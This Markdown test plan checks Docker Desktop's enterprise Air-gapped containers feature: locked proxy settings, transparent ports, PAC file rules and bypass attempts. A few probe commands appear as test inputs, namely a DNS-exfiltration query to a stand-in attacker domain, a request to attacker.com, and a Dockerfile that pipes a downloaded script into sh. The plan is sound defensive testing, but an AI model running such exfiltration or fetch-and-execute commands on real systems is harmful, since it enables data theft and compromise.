# Docker Enterprise Air-Gapped Containers Test Plan

## 1. Overview

### Purpose
Test Docker Desktop's enterprise Air-gapped containers feature, which uses proxy rules to control container network access through:
- **Settings Management**: Policy enforcement via `admin-settings.json`
- **Proxy Rules**: HTTP/HTTPS/SOCKS5 proxy routing
- **PAC Files**: Fine-grained destination-based rules
- **Port Filtering**: Selective port-based policy application

### Test Environment Requirements
- **Docker Desktop**: Version 4.29 or later
- **Subscription**: Docker Business (required for Air-gapped containers)
- **Configuration**: Settings Management enabled
- **Admin Access**: Ability to modify `admin-settings.json`

---

## 2. Air-Gapped Containers Configuration Tests

### 2.1 Configuration Enforcement Tests

#### Test 2.1.1: Locked Configuration Enforcement
**Objective**: Verify locked settings cannot be overridden by users

**Setup**:
```json
{
  "configurationFileVersion": 2,
  "containersProxy": {
    "locked": true,
    "mode": "manual",
    "http": "",
    "https": "",
    "exclude": [],
    "transparentPorts": "*"
  }
}
```

**Steps**:
1. Apply locked configuration via Settings Management
2. Attempt to override via Docker Desktop UI
3. Attempt to override via `docker run` proxy environment variables
4. Verify settings remain locked

**Expected Result**: Configuration cannot be changed by end users

---

#### Test 2.1.2: Configuration Reload
**Objective**: Verify configuration changes take effect without restart

**Steps**:
1. Start with permissive configuration
2. Run container that accesses external service
3. Update to restrictive configuration
4. Run same container command
5. Verify new restrictions apply

**Expected Result**: New configuration applies to new containers immediately

---

### 2.2 Transparent Ports Configuration

#### Test 2.2.1: Wildcard Port Filtering
**Objective**: Verify `"transparentPorts": "*"` applies to all ports

**Configuration**:
```json
"containersProxy": {
  "locked": true,
  "mode": "manual",
  "http": "",
  "https": "",
  "transparentPorts": "*"
}
```

**Steps**:
```bash
# Test various ports
docker run --rm alpine wget -O- http://example.com:80
docker run --rm alpine wget -O- https://example.com:443
docker run --rm alpine nc -vz example.com 22
docker run --rm alpine nc -vz example.com 3306
```

**Expected Result**: All ports are blocked (no proxy configured)

---

#### Test 2.2.2: Selective Port Filtering
**Objective**: Verify specific ports can be targeted

**Configuration**:
```json
"containersProxy": {
  "locked": true,
  "mode": "manual",
  "http": "",
  "https": "",
  "transparentPorts": "80,443"
}
```

**Steps**:
```bash
# Should be blocked (ports 80/443 in transparentPorts)
docker run --rm alpine wget -O- http://example.com:80
docker run --rm alpine wget -O- https://example.com:443

# Should bypass proxy rules (not in transparentPorts)
docker run --rm alpine nc -vz example.com 22
docker run --rm alpine nc -vz example.com 3306
```

**Expected Result**: Only specified ports subject to proxy rules

---

## 3. Proxy Routing Tests

### 3.1 Block All Traffic

#### Test 3.1.1: Complete Network Isolation
**Objective**: Verify all external access can be blocked

**Configuration**:
```json
"containersProxy": {
  "locked": true,
  "mode": "manual",
  "http": "",
  "https": "",
  "exclude": [],
  "transparentPorts": "*"
}
```

**Steps**:
```bash
# All should fail
docker run --rm alpine wget -O- http://google.com
docker run --rm alpine wget -O- https://docker.io
docker run --rm alpine ping -c 1 8.8.8.8
docker run --rm alpine nslookup google.com
```

**Expected Result**: All external connections blocked or timeout

---

### 3.2 Exclude List (Allowlist)

#### Test 3.2.1: Hostname Exclusions
**Objective**: Verify specific hosts can bypass proxy

**Configuration**:
```json
"containersProxy": {
  "locked": true,
  "mode": "manual",
  "http": "",
  "https": "",
  "exclude": ["docker.io", "github.com"],
  "transparentPorts": "*"
}
```

**Steps**:
```bash
# Should succeed (in exclude list)
docker run --rm alpine wget -O- https://docker.io
docker run --rm alpine wget -O- https://github.com

# Should fail (not in exclude list)
docker run --rm alpine wget -O- https://google.com
```

**Expected Result**: Excluded hosts accessible, others blocked

---

#### Test 3.2.2: CIDR Range Exclusions
**Objective**: Verify IP ranges can be excluded

**Configuration**:
```json
"containersProxy": {
  "locked": true,
  "mode": "manual",
  "http": "",
  "https": "",
  "exclude": ["10.0.0.0/8", "192.168.0.0/16"],
  "transparentPorts": "*"
}
```

**Steps**:
```bash
# Should succeed (internal ranges)
docker run --rm alpine wget -O- http://10.1.2.3
docker run --rm alpine wget -O- http://192.168.1.100

# Should fail (external IP)
docker run --rm alpine wget -O- http://8.8.8.8
```

**Expected Result**: Internal IPs accessible, external blocked

---

### 3.3 Proxy Server Routing

#### Test 3.3.1: HTTP Proxy Routing
**Objective**: Verify traffic routes through HTTP proxy

**Configuration**:
```json
"containersProxy": {
  "locked": true,
  "mode": "manual",
  "http": "http://test-proxy.local:8080",
  "https": "http://test-proxy.local:8080",
  "exclude": [],
  "transparentPorts": "*"
}
```

**Setup**: Start test proxy server
```bash
# Terminal 1: Start simple proxy
docker run -d --name test-proxy -p 8080:8080 \
  -e LOG_LEVEL=debug \
  wernight/dante
```

**Steps**:
```bash
# Should route through proxy
docker run --rm alpine wget -O- http://example.com

# Check proxy logs for connection
docker logs test-proxy | grep example.com
```

**Expected Result**: Traffic appears in proxy logs

---

#### Test 3.3.2: SOCKS5 Proxy Routing
**Objective**: Verify SOCKS5 proxy support (via PAC file)

**PAC File** (`socks-proxy.pac`):
```javascript
function FindProxyForURL(url, host) {
  return "SOCKS5 test-socks-proxy.local:1080";
}
```

**Configuration**:
```json
"containersProxy": {
  "locked": true,
  "mode": "manual",
  "pac": "http://pac-server.local/socks-proxy.pac",
  "transparentPorts": "*"
}
```

**Expected Result**: Traffic routes through SOCKS5 proxy

---

## 4. PAC File Tests

### 4.1 Basic PAC File Functionality

#### Test 4.1.1: PAC File Download and Application
**Objective**: Verify PAC file is fetched and applied

**Setup**:
```bash
# Start simple HTTP server with PAC file
mkdir -p /tmp/pac-server
cat > /tmp/pac-server/proxy.pac << 'EOF'
function FindProxyForURL(url, host) {
  if (host === "allowed.example.com") {
    return "DIRECT";
  }
  return "PROXY reject.docker.internal:1234";
}
EOF

# Serve PAC file
docker run -d --name pac-server -p 8888:80 \
  -v /tmp/pac-server:/usr/share/nginx/html:ro \
  nginx:alpine
```

**Configuration**:
```json
"containersProxy": {
  "locked": true,
  "mode": "manual",
  "pac": "http://host.docker.internal:8888/proxy.pac",
  "transparentPorts": "*"
}
```

**Steps**:
```bash
# Should succeed (DIRECT rule)
docker run --rm alpine wget -O- http://allowed.example.com

# Should fail (REJECT rule)
docker run --rm alpine wget -O- http://blocked.example.com
```

**Expected Result**: PAC rules are enforced

---

#### Test 4.1.2: PAC File Download Failure Handling
**Objective**: Verify behavior when PAC file unavailable

**Steps**:
1. Configure PAC file URL pointing to non-existent server
2. Attempt container network access
3. Verify blocking behavior

**Expected Result**: Failed PAC download results in blocked requests

---

### 4.2 PAC File Rule Complexity

#### Test 4.2.1: Domain-Based Rules
**Objective**: Test `dnsDomainIs` and `localHostOrDomainIs` functions

**PAC File**:
```javascript
function FindProxyForURL(url, host) {
  // Allow Docker registries
  if (dnsDomainIs(host, ".docker.io") || host === "docker.io") {
    return "DIRECT";
  }
  
  // Allow internal domains
  if (localHostOrDomainIs(host, "internal.company.com")) {
    return "DIRECT";
  }
  
  // Block everything else
  return "PROXY reject.docker.internal:1234";
}
```

**Steps**:
```bash
# Should succeed
docker run --rm alpine wget -O- https://registry-1.docker.io
docker run --rm alpine wget -O- https://docker.io

# Should fail
docker run --rm alpine wget -O- https://google.com
```

**Expected Result**: Domain matching works correctly

---

#### Test 4.2.2: IP-Based Rules
**Objective**: Test `isInNet` function

**PAC File**:
```javascript
function FindProxyForURL(url, host) {
  // Allow internal networks
  if (isInNet(host, "10.0.0.0", "255.0.0.0") ||
      isInNet(host, "192.168.0.0", "255.255.0.0")) {
    return "DIRECT";
  }
  
  // Block external IPs
  return "PROXY reject.docker.internal:1234";
}
```

**Steps**:
```bash
# Should succeed (internal IPs)
docker run --rm alpine wget -O- http://10.1.2.3
docker run --rm alpine wget -O- http://192.168.1.100

# Should fail (external IP)
docker run --rm alpine wget -O- http://93.184.216.34  # example.com
```

**Expected Result**: IP range matching works correctly

---

#### Test 4.2.3: Port-Based Rules
**Objective**: Test URL-based port filtering

**PAC File**:
```javascript
function FindProxyForURL(url, host) {
  // Allow HTTP/HTTPS to specific host
  if (host === "api.company.com") {
    if (url.indexOf(":443") > 0 || url.indexOf(":80") > 0) {
      return "DIRECT";
    }
  }
  
  return "PROXY reject.docker.internal:1234";
}
```

**Steps**:
```bash
# Should succeed
docker run --rm alpine wget -O- http://api.company.com:80
docker run --rm alpine wget -O- https://api.company.com:443

# Should fail (different port)
docker run --rm alpine nc -vz api.company.com 22
```

**Expected Result**: Port-based rules work correctly

---

#### Test 4.2.4: Path-Based Rules
**Objective**: Test URL path matching

**PAC File**:
```javascript
function FindProxyForURL(url, host) {
  // Allow specific API endpoints
  if (host === "api.example.com" && url.indexOf("/public/") > 0) {
    return "DIRECT";
  }
  
  return "PROXY reject.docker.internal:1234";
}
```

**Steps**:
```bash
# Should succeed (public path)
docker run --rm alpine wget -O- https://api.example.com:443/public/data

# Should fail (private path)
docker run --rm alpine wget -O- https://api.example.com:443/private/data
```

**Expected Result**: Path-based filtering works

**Note**: Per documentation, only host and port available for non-80/443 ports

---

### 4.3 Complex PAC File Scenarios

#### Test 4.3.1: Multi-Tier Proxy Routing
**Objective**: Test different proxies for different destinations

**PAC File**:
```javascript
function FindProxyForURL(url, host) {
  // Internal services - direct
  if (isInNet(host, "10.0.0.0", "255.0.0.0")) {
    return "DIRECT";
  }
  
  // Development tools - dev proxy
  if (dnsDomainIs(host, ".github.com") || dnsDomainIs(host, ".npmjs.com")) {
    return "PROXY dev-proxy.company.com:8080";
  }
  
  // Docker registries - registry proxy
  if (dnsDomainIs(host, ".docker.io") || dnsDomainIs(host, ".gcr.io")) {
    return "PROXY registry-proxy.company.com:8080";
  }
  
  // Block everything else
  return "PROXY reject.docker.internal:1234";
}
```

**Expected Result**: Traffic routes to appropriate proxy based on destination

---

#### Test 4.3.2: Failover Proxy Chain
**Objective**: Test proxy failover with multiple proxies

**PAC File**:
```javascript
function FindProxyForURL(url, host) {
  // Try primary, fallback to secondary, then block
  return "PROXY primary-proxy.company.com:8080; PROXY secondary-proxy.company.com:8080; PROXY reject.docker.internal:1234";
}
```

**Steps**:
1. Primary proxy down → should use secondary
2. Both proxies down → should block
3. Primary comes back → should use primary

**Expected Result**: Proxy failover works as expected

---

## 5. Security Bypass Attempt Tests

### 5.1 Configuration Bypass Attempts

#### Test 5.1.1: Environment Variable Override Attempt
**Objective**: Verify proxy env vars don't bypass air-gap config

**Steps**:
```bash
# Try to override with environment variables
docker run --rm \
  -e HTTP_PROXY=http://external-proxy.com:8080 \
  -e HTTPS_PROXY=http://external-proxy.com:8080 \
  -e NO_PROXY="" \
  alpine wget -O- http://google.com
```

**Expected Result**: Air-gap configuration takes precedence

---

#### Test 5.1.2: Docker Network Bypass Attempt
**Objective**: Verify custom networks don't bypass rules

**Steps**:
```bash
# Create custom network
docker network create bypass-network

# Try to use it
docker run --rm --network bypass-network alpine wget -O- http://google.com
```

**Expected Result**: Air-gap rules still apply

---

#### Test 5.1.3: Host Network Mode Attempt
**Objective**: Verify `--network host` doesn't bypass rules

**Steps**:
```bash
docker run --rm --network host alpine wget -O- http://google.com
```

**Expected Result**: Rules apply even with host networking (if supported)

---

### 5.2 Protocol-Based Bypass Attempts

#### Test 5.2.1: DNS Tunneling Prevention
**Objective**: Verify DNS queries are controlled

**Steps**:
```bash
# Standard DNS query
docker run --rm alpine nslookup google.com

# DNS tunneling attempt (if DNS port in transparentPorts)
docker run --rm alpine dig txt data.exfil.attacker.com
```

**Expected Result**: DNS queries follow proxy rules

---

#### Test 5.2.2: Alternative Protocol Access
**Objective**: Test non-HTTP protocols

**Steps**:
```bash
# FTP
docker run --rm alpine ftp ftp.example.com

# SSH
docker run --rm alpine ssh user@example.com

# Custom protocols
docker run --rm alpine nc -vz example.com 9999
```

**Expected Result**: Protocols follow transparentPorts configuration

---

## 6. Performance and Reliability Tests

### 6.1 Performance Impact

#### Test 6.1.1: Throughput Impact
**Objective**: Measure performance overhead of proxy routing

**Steps**:
1. Download large file without air-gap config (baseline)
2. Download same file with air-gap proxy routing
3. Compare throughput

**Metrics**: Bandwidth, latency, overhead percentage

---

#### Test 6.1.2: Connection Establishment Latency
**Objective**: Measure connection setup overhead

**Steps**:
```bash
# Measure time to establish connections
time docker run --rm alpine wget -O /dev/null http://example.com
```

**Expected Result**: Document latency impact

---

### 6.2 Reliability Tests

#### Test 6.2.1: Concurrent Connection Handling
**Objective**: Verify stability under load

**Steps**:
```bash
# Run multiple containers simultaneously
for i in {1..50}; do
  docker run --rm alpine wget -O- http://allowed.example.com &
done
wait
```

**Expected Result**: All connections handled correctly

---

#### Test 6.2.2: Long-Running Connection Stability
**Objective**: Verify persistent connections remain stable

**Steps**:
```bash
# Long-running download
docker run --rm alpine wget -O /dev/null http://example.com/largefile.iso
```

**Expected Result**: Connection doesn't drop or fail

---

## 7. Integration Tests with ECI

### 7.1 Combined ECI + Air-Gapped Tests

#### Test 7.1.1: Layered Security Validation
**Objective**: Verify both protections work together

**Setup**:
- ECI enabled in Docker Desktop
- Air-gapped containers configured with restrictive policy

**Steps**:
```bash
# Should be blocked by air-gap policy
docker run --rm alpine wget -O- http://google.com

# Should be blocked by ECI
docker run --rm alpine ls /Users

# Multi-vector attack
docker run --rm alpine sh -c '
  wget -O- http://google.com 2>&1 || echo "Network blocked"
  ls /System 2>&1 || echo "Filesystem blocked"
  ps aux | wc -l  # Should show limited processes
'
```

**Expected Result**: Both layers provide independent protection

---

#### Test 7.1.2: Resource Isolation with Network Control
**Objective**: Test combined resource + network isolation

**Steps**:
```bash
docker run --rm \
  --cpus=0.5 \
  --memory=256m \
  alpine sh -c '
    # Network should be restricted by air-gap
    wget -O- http://attacker.com 2>&1
    # CPU/memory limited
    yes > /dev/null &
  '
```

**Expected Result**: Both resource and network controls enforced

---

## 8. Real-World Scenario Tests

### 8.1 Development Workflow

#### Test 8.1.1: Package Manager Access
**Objective**: Verify development tools can access approved registries

**PAC File**:
```javascript
function FindProxyForURL(url, host) {
  // Allow package registries
  if (dnsDomainIs(host, ".npmjs.com") ||
      dnsDomainIs(host, ".pypi.org") ||
      dnsDomainIs(host, ".maven.org")) {
    return "PROXY dev-proxy.company.com:8080";
  }
  
  return "PROXY reject.docker.internal:1234";
}
```

**Steps**:
```bash
# Should work (through proxy)
docker run --rm node:alpine npm install express

# Should work
docker run --rm python:alpine pip install requests

# Should fail
docker run --rm alpine wget -O- http://google.com
```

**Expected Result**: Development workflows function correctly

---

#### Test 8.1.2: Container Image Pull
**Objective**: Verify image pulls work with air-gap config

**Steps**:
```bash
# Should work (if Docker Hub allowed)
docker pull alpine:latest

# Should work (if custom registry allowed)
docker pull custom-registry.company.com/app:latest

# Should fail (if blocked)
docker pull docker.io/malicious/image:latest
```

**Expected Result**: Approved registries accessible, others blocked

---

### 8.2 Build-Time Tests

#### Test 8.2.1: Dockerfile Build with Network Access
**Objective**: Test network access during image builds

**Dockerfile**:
```dockerfile
FROM alpine
RUN wget -O- http://example.com/script.sh | sh
```

**Steps**:
```bash
docker build -t test-build .
```

**Expected Result**: Build follows air-gap rules

---

## 9. Monitoring and Observability

### 9.1 Logging and Auditing

#### Test 9.1.1: Connection Attempt Logging
**Objective**: Verify blocked connections are logged

**Steps**:
1. Attempt blocked connection
2. Check Docker Desktop logs
3. Verify attempt is recorded

**Expected Result**: Security events logged for audit

---

#### Test 9.1.2: Policy Violation Detection
**Objective**: Identify and log policy violations

**Steps**:
1. Configure restrictive policy
2. Run container that violates policy
3. Check logs for violation records

**Expected Result**: Violations logged with details

---

## 10. Test Execution Framework

### 10.1 Automated Test Runner

```bash
#!/bin/bash
# air-gap-test-runner.sh

# Prerequisites check
check_docker_version() {
  # Verify Docker Desktop 4.29+
}

check_settings_management() {
  # Verify admin-settings.json exists and is applied
}

check_subscription() {
  # Verify Docker Business subscription
}

# Configuration helpers
apply_config() {
  local config_file=$1
  # Apply config to Docker Desktop
}

wait_for_config_reload() {
  # Wait for configuration to take effect
}

# Test execution
run_test_suite() {
  local suite=$1
  # Execute test suite with proper setup/teardown
}
```

---

## 11. Success Criteria

### Air-Gapped Container Tests
- ✅ Locked configuration cannot be overridden
- ✅ transparentPorts filtering works correctly
- ✅ Block-all configuration prevents external access
- ✅ Exclude list allows approved destinations
- ✅ Proxy routing functions correctly
- ✅ PAC file rules are enforced
- ✅ Domain, IP, port, and path matching works
- ✅ Configuration bypass attempts fail
- ✅ Performance impact is acceptable
- ✅ Integration with ECI provides layered security

---

## 12. Reporting Template

```markdown
# Air-Gapped Containers Test Report

**Date**: [DATE]
**Docker Desktop Version**: [VERSION]
**Subscription**: Docker Business
**Configuration**: [admin-settings.json path]

## Configuration Under Test
[Include admin-settings.json content]

## Test Results Summary
- Total Tests: X
- Passed: Y
- Failed: Z

## Failed Tests
| Test ID | Description | Result | Notes |
|---------|-------------|--------|-------|
| 4.2.1   | Domain Rules | FAIL   | [Details] |

## Security Findings
1. [Finding]
   - Severity: [High/Medium/Low]
   - Impact: [Description]
   - Recommendation: [Action]

## Performance Impact
- Connection latency: +X ms
- Throughput overhead: Y%
- PAC evaluation time: Z ms

## Recommendations
[Specific recommendations for production deployment]
```

---

## 13. Next Steps for Testing

1. **Prerequisites Setup**:
   - Verify Docker Business subscription
   - Enable Settings Management
   - Prepare test PAC files and proxy servers

2. **Basic Configuration Tests**:
   - Test locked vs unlocked settings
   - Verify transparentPorts filtering
   - Test exclude list functionality

3. **PAC File Tests**:
   - Start with simple PAC rules
   - Progress to complex multi-tier routing
   - Test edge cases and error handling

4. **Integration Tests**:
   - Combine with ECI testing
   - Test real development workflows
   - Validate with actual application scenarios

5. **Production Readiness**:
   - Performance benchmarking
   - Security audit
   - Documentation and runbooks
